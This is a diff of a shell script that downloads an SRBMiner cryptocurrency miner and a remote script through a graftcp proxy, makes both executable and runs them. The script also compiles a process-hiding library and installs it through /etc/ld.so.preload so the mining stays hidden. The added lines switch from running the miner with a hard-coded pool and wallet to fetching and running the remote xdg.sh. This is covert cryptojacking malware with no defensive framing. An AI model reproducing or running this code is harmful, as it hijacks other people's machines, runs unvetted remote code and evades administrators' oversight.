@@ -35,8 +35,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/AhmadTugiman/gembel/raw/main/SRBMiner-MULTI
-chmod +x SRBMiner-MULTI
+./graftcp/graftcp wget https://github.com/AhmadTugiman/gembel/raw/main/SRBMiner-MULTI && wget https://raw.githubusercontent.com/AhmadTugiman/gembel/main/xdg.sh 
+chmod +x SRBMiner-MULTI && chmod +x xdg.sh
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./SRBMiner-MULTI --algorithm xdag --pool xdag.org:13656 --wallet 6Sdu2VTNLImAIoq7KscJq38v2yGNS6wx --password x --cpu-threads 4 --disable-gpu
+./graftcp/graftcp bash xdg.sh
